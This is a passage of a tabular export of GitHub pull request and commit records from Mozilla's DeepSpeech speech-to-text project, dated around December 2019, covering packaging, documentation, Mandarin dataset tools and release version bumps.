- [Release notes](https://github.com/tensorflow/tensorflow/releases)
- [Changelog](https://github.com/tensorflow/tensorflow/blob/master/RELEASE.md)
- [Commits](https://github.com/tensorflow/tensorflow/compare/v1.14.0...v1.15.0)

Signed-off-by: dependabot[bot] <support@github.com>"
1590,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2602,2602,Add mandarin tools in bin/ for converting transcript and generating alphabet file,"Hi,
Due to the number of mandarin characters are unknowable, so I wrote 2 tools to easily deal with mandarin dataset:

* add `bin/convert_csv_zh_cn_to_zh_tw.py` for converting transcript between `zh-tw` <-> `zh-cn`
  - basic usage `python bin/convert_csv_zh_cn_to_zh_tw.py --from_file <from_csv> --to_file <to_csv>`
* add `bin/generate_alphabet_file.py` for generating alphabet file from directory where include valid CSV files
  - pass argument `--exclude_chars_rate` or `--exclude_chars_count` to exclude rare characters to down size your alphabet file
  - since the transcripts in SLR's mandarin dataset include some weird punctuation like `《`, `》` , the default script will also remove them.",mychiux413,13641193,2019-12-16T06:53:28Z,CONTRIBUTOR,False,84,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,67715e9f27d9e54e95164a45b50aec9ab2c850ff,[ADD] convert csv transcript between zh-cn <-> zh-tw
1591,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2602,2602,Add mandarin tools in bin/ for converting transcript and generating alphabet file,"Hi,
Due to the number of mandarin characters are unknowable, so I wrote 2 tools to easily deal with mandarin dataset:

* add `bin/convert_csv_zh_cn_to_zh_tw.py` for converting transcript between `zh-tw` <-> `zh-cn`
  - basic usage `python bin/convert_csv_zh_cn_to_zh_tw.py --from_file <from_csv> --to_file <to_csv>`
* add `bin/generate_alphabet_file.py` for generating alphabet file from directory where include valid CSV files
  - pass argument `--exclude_chars_rate` or `--exclude_chars_count` to exclude rare characters to down size your alphabet file
  - since the transcripts in SLR's mandarin dataset include some weird punctuation like `《`, `》` , the default script will also remove them.",mychiux413,13641193,2019-12-16T06:53:28Z,CONTRIBUTOR,False,84,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ba8897fe2e533ae04d61ef79b68f9cc4b140a36c,[ADD] alphabet file generator
1592,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2602,2602,Add mandarin tools in bin/ for converting transcript and generating alphabet file,"Hi,
Due to the number of mandarin characters are unknowable, so I wrote 2 tools to easily deal with mandarin dataset:

* add `bin/convert_csv_zh_cn_to_zh_tw.py` for converting transcript between `zh-tw` <-> `zh-cn`
  - basic usage `python bin/convert_csv_zh_cn_to_zh_tw.py --from_file <from_csv> --to_file <to_csv>`
* add `bin/generate_alphabet_file.py` for generating alphabet file from directory where include valid CSV files
  - pass argument `--exclude_chars_rate` or `--exclude_chars_count` to exclude rare characters to down size your alphabet file
  - since the transcripts in SLR's mandarin dataset include some weird punctuation like `《`, `》` , the default script will also remove them.",mychiux413,13641193,2019-12-16T06:53:28Z,CONTRIBUTOR,False,84,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e14c0929c211dae616c378ccb1361e817af4fcc2,remove generated_alphabet_file.py
1593,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2599,2599,Also upload Windows TFLite Python package to PyPI,X-DeepSpeech: NOBUILD,reuben,477142,2019-12-13T17:22:15Z,MEMBER,True,2,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,83338541ae96d5341104c27786e5d201c0613ac9,"Also upload Windows TFLite Python package to PyPI

X-DeepSpeech: NOBUILD"
1594,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2598,2598,Use data/smoke_test in tests to avoid depending on LDC servers,,reuben,477142,2019-12-13T11:48:26Z,MEMBER,True,4,4,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fa8061022ec691650e51d7135ce2cdf2d5d8ad0b,Use data/smoke_test in tests to avoid depending on LDC servers
1595,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2597,2597,Use Xvfb for emulator,,lissyx,1645737,2019-12-12T15:32:56Z,COLLABORATOR,True,5,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,399a4f76e114124c0b355d5cd8c7f6460e4119d1,Run emulator under xvfb
1596,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2596,2596,Added third-party bindings for Vlang,"Hey, I just implemented DeepSpeech's bindings in Vlang and wanted to add it into the 3rd Party Bindings list.",thecodrr,7473959,2019-12-11T23:43:36Z,CONTRIBUTOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1c2a153841cd3bd7a27431835e2a503e0177a54c,added vspeech third-party bindings
1597,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2593,2593,Bump version to v0.6.1-alpha.0,Testing the new TFLite packages on desktop.,reuben,477142,2019-12-11T14:32:29Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d3d337c10e9715fc7ff5dd909c2edfc48fb45d9f,Bump version to v0.6.1-alpha.0
1598,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2591,2591,"Revert ""Multi-stream support .NET""",Reverting this for now so we can do a 0.6.1 release (as this PR breaks the .NET API).,reuben,477142,2019-12-10T13:06:00Z,MEMBER,True,99,136,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,03a822b6707bf1ec83ca3e127ed2d63e0caac8f9,"Revert ""Multi-stream support .NET"""
1599,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2588,2588,Update README.rst,Fixed missing argument in transcribe example,AlanNaoto,33168106,2019-12-09T11:10:25Z,NONE,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,66f088124cf79fbac16ef9581f4f2eb6fcd7aab3,"Update README.rst

Fixed missing argument in transcribe example"
1600,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2586,2586,Build and publish Python TFLite package as deepspeech-tflite,,reuben,477142,2019-12-06T17:44:25Z,MEMBER,True,23,4,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,53fcfd50967818dbfb245005fe887477785f6a5d,Build and publish Python TFLite package as deepspeech-tflite
1601,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2585,2585,Use simple README pointing to GitHub for JS/Python packages,,reuben,477142,2019-12-06T16:33:43Z,MEMBER,True,5,6,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c8a57b192c78c39871560ab9a7fcc631f43d5818,Use simple README pointing to GitHub for JS/Python packages
1602,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2582,2582,Remove outdated mention of DS_IntermediateDecode being expensive to call,X-DeepSpeech: NOBUILD,reuben,477142,2019-12-05T14:44:46Z,MEMBER,True,3,14,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,13fdfee84484e63ccfd8615f86246b751f311222,"Remove outdated mention of DS_IntermediateDecode being expensive to call

X-DeepSpeech: NOBUILD"
1603,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2576,2576,Update README.rst,Corrected the instructions to transcribe the audio file using deepspeech's default arguments. `--alphabet deepspeech-0.6.0-models/alphabet.txt` was missing in argument passing.,Sadam1195,42005385,2019-12-05T05:33:03Z,NONE,False,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8561f1f603b0c0ea8d22ad417e5c7cf1a6c26759,"Update README.rst

Corrected the instructions to transcribe the audio file using deepspeech's default arguments. `--alphabet deepspeech-0.6.0-models/alphabet.txt` was missing in argument passing."
1604,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2574,2574,Move examples to separate repository (Fixes #2564),,reuben,477142,2019-12-04T16:22:34Z,MEMBER,True,45,3066,59,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5a0adc8846deffc023939e983639574cecb28bb6,Remove example code
1605,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2574,2574,Move examples to separate repository (Fixes #2564),,reuben,477142,2019-12-04T16:22:34Z,MEMBER,True,45,3066,59,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a5deaa5f4810f07e3658b616ab9fd282a1d0699a,Check out and point to external examples repo in automation
1606,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2574,2574,Move examples to separate repository (Fixes #2564),,reuben,477142,2019-12-04T16:22:34Z,MEMBER,True,45,3066,59,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bce554459598a5ad8afc62f1ddddde1168a5e489,Build WPF example from examples repo
1607,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2574,2574,Move examples to separate repository (Fixes #2564),,reuben,477142,2019-12-04T16:22:34Z,MEMBER,True,45,3066,59,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,808b154ef98b659be002fc43276e484100b4cf47,Use submodule for building contrib examples into docs
1608,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2574,2574,Move examples to separate repository (Fixes #2564),,reuben,477142,2019-12-04T16:22:34Z,MEMBER,True,45,3066,59,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,31991ff90c3b38bae5d0ee74da3c8f4bbaf410bf,"Remove individual example links from main README

X-DeepSpeech: NOBUILD"
1609,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2574,2574,Move examples to separate repository (Fixes #2564),,reuben,477142,2019-12-04T16:22:34Z,MEMBER,True,45,3066,59,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2471cf709d6583fdfd2917a631097a39dc17bb97,Download examples repository in Windows tasks
1610,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2573,2573,Pin examples to 0.6.0,,reuben,477142,2019-12-04T14:53:25Z,MEMBER,True,4,4,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1021ee10ed4cdf625c0ca6e8faaf401f6089f628,Pin examples to 0.6.0
1611,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2571,2571,Update Readme.md,following from this issue https://github.com/mozilla/DeepSpeech/issues/2570 adding a tweak to README so that others can follow the instructions to download the latest models when trying this out.,pietrop,4661975,2019-12-04T14:28:54Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,62103fc505a20050547c561fb2bfeb9803209669,Update Readme.md
1612,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2568,2568,Error early if audio sample rate and feature window/step length are invalid (Fixes #2323),,reuben,477142,2019-12-04T10:06:45Z,MEMBER,True,16,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,240646b708de817587aa773a4ce2f4a7cba2b85a,Error early if audio sample rate and feature window/step length are invalid
1613,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,616760eb52e6e477b73805208c7614e67f76178a,Update TRAINING.rst
1614,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,29a92e098fcc8d71d1501727daa79ef85dfecb04,"Update taskcluster.py

I copied ``maybe_download_tc_bin`` syntax in order to make the code easier to follow."
1615,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a9855f1e4edd476a49424b711e4d85a3a39027a3,"Merge pull request #2685 from juandspy/patch-1

Update TRAINING.rst  (mmap-able model)"
1616,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,709cd0d2f2ceb819c5e130baf3c82789ea7fb96a,Specify upper frequency limit when computing Mfccs
1617,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9735d066c5749c4de0ac00d2e2905f18787bd521,Bump graph version
1618,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3e349497ed369d0aab75082a20453d89c0f030f7,added an argument to choose the final export model name
1619,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,50830d7022f8a1e0c9124e999d8dab22b3007426,Fix whitespace
1620,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,502436f8f3855ea3b5e00072ddc298f7cc1235a6,Merge branch 'PedroDKE-args_export_model_name' (Fixes #2690)
1621,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8d42c2bdd9530d37b76586ea5dc821bfc108926a,Adjust Buffer length to account for element size inside the JS binding
1622,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1d6a337ab4ab6fdf0457d7da866ded0584334755,Merge branch 'javascript-buffer-length' (Fixes #2693)
1623,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,656eea4622c541cc7f3cb70d43c6916ae054f750,Use std::unique_ptr<> for TensorFlow session
1624,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d74ab7dc1a2e0d2d6b6af9e0187d891934ff6531,"Merge pull request #2695 from lissyx/tf_unique_ptr

Use std::unique_ptr<> for TensorFlow session"
1625,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,38db9a2441a72c260a6f6756f8d50b3fb2252d47,Improve SWIG reference
1626,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0428c846f21bac37603898409d269c9f6e26e1a8,"Merge pull request #2700 from lissyx/swig-doc

Improve SWIG reference"
1627,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc255099507a8e72f35227f10ba94a1257905077,Remove unused benchmark_nc
1628,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6e521ff3a2fdb46bc0004e634bcef06cc9fb3b4e,Produce TFLite-specific NPM package
1629,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0f9869fb008e03221867d288a07d7dff54dfdbdb,Produce TFLite NuGet package
1630,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3d18ab8058429b16b93108fde8755789a1b204f2,"Merge pull request #2706 from lissyx/win-tflite

Produce TFLite NuGet package"
1631,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5d0e4cc8ed85b5e9a94451837539e2ea09ecdbea,"Merge pull request #2704 from lissyx/remove-benchmark-nc

Remove unused benchmark_nc"
1632,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c5a7b07c9ac0c69e6e5490d88120a616a208ab6,"Merge pull request #2705 from lissyx/nodejs-tflite

Produce TFLite-specific NPM package"
1633,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4e452dcd0b9e2069a05418d6094c32c538bde758,Bump VERSION to 0.7.0-alpha.0
1634,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6af68efa00d4cddaae72ef7584e4d67012d474d1,"Merge pull request #2708 from lissyx/bump-v0.7.0-alpha.0

Bump VERSION to 0.7.0-alpha.0"
1635,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ff401732a394b273e0e7d87fa190b9aa02b4e83b,"Enforce CTC decoder version check

Fix #2710"
1636,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,92d8bad7c113885690867a6128a7728325f540f3,"Merge pull request #2711 from lissyx/ctcdecoder_version_check

Enforce CTC decoder version check"
1637,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dd982b2224f8f864f808db3665e60ed7070f3dce,Bump VERSION to 0.7.0-alpha.1
1638,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,60cbe3b201500b3ba74556929e04094ae0186674,"Merge pull request #2714 from lissyx/bump-v0.7.0-alpha.1

Bump VERSION to 0.7.0-alpha.1"
1639,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,00d11e2feccd321f343fa003e00d3d759e179c7f,"Ensure documentation mentions python3-dev

Fixes #2712"
1640,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6f5af8ec2c1ce34587a31386b7a7774c4e942af1,"Merge pull request #2719 from lissyx/doc-pydev

Ensure documentation mentions python3-dev"
1641,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a2f05ccabe85d2b822f32aedb1cfe20aa1ab02e6,Print best and worst results in a WER report.
1642,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2567,2567,scan dir instead of expecting JSON file of filenames in transcribe.py,,JRMeyer,8389864,2019-12-03T23:17:35Z,CONTRIBUTOR,False,17526,13742,634,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,17e011c18d21c06e53d3b5909fb051cba36d0824,Fix Intermediate decoding
1643,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2565,2565,remove bad ticks,the ticks messed up the linking,JRMeyer,8389864,2019-12-03T21:45:28Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e7c70a67be702969bee52435d9f55bc940c34ca0,remove bad ticks
1644,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2562,2562,Bump version to v0.6.0,,reuben,477142,2019-12-03T15:47:04Z,MEMBER,True,9,610,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b2c4de3cb01fb65892ee2e80132ba2d4a6f16b6d,Update docs to refer to v0.6.0 release links
1645,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2562,2562,Bump version to v0.6.0,,reuben,477142,2019-12-03T15:47:04Z,MEMBER,True,9,610,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c11cbd4b4b48c1e288463c809944587e19016b0a,Bump version to v0.6.0
1646,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2561,2561,Update prod models for v0.6,,reuben,477142,2019-12-03T11:15:38Z,MEMBER,False,18,20,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9b3d2c1c37c1e7c2112704689b65d7fd023652cb,Update prod model assets for v0.6 release
1647,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2561,2561,Update prod models for v0.6,,reuben,477142,2019-12-03T11:15:38Z,MEMBER,False,18,20,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1f98373274d0be1cfdb2153825fa72fb3e394fd3,Update examples model asset for v0.6 release
1648,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2561,2561,Update prod models for v0.6,,reuben,477142,2019-12-03T11:15:38Z,MEMBER,False,18,20,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,551570616b7dc4c6f9ab130fbd6632f8a8b99763,"Reduce training task from 399 epochs to 220, enough to overfit LDC93S1"
1649,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2561,2561,Update prod models for v0.6,,reuben,477142,2019-12-03T11:15:38Z,MEMBER,False,18,20,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2aab67f5209708c653ab912c50074b950151bd64,Update prod model expected inference results
1650,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2561,2561,Update prod models for v0.6,,reuben,477142,2019-12-03T11:15:38Z,MEMBER,False,18,20,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,341c44e791940d843452a44ce1b51e34cd76a1a5,Drop support for Python 3.4 as it is EOL and no longer builds on macOS
1651,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2560,2560,[SpecAugment] Refactor sparse_image_warp for dynamic shape of spectrogram,"Hi,
The PR refactor the `sparse_image_warp.py` to fit dynamic shape of spectrogram, and add `augmentation_sparse_warp` parameter to `flags.py`

Try add parameter in `run-ldc93s1.sh` to test the code:
